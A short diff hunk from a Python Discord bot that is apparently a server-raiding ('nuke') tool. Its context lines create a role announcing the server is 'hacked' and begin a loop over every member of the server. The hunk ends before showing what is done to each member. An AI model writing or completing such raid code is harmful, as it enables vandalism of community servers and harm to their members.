@@ -87,7 +87,7 @@ async def r(ctx):
         await guild.create_role(name="skiddy owns you lol HhackedhackedckEd HackEd HackEd")
  
 
-@client.command(pass_context=True)
+@bot.command(pass_context=True)
 async def h(ctx):
         for user in list(ctx.message.server.members):
             try:
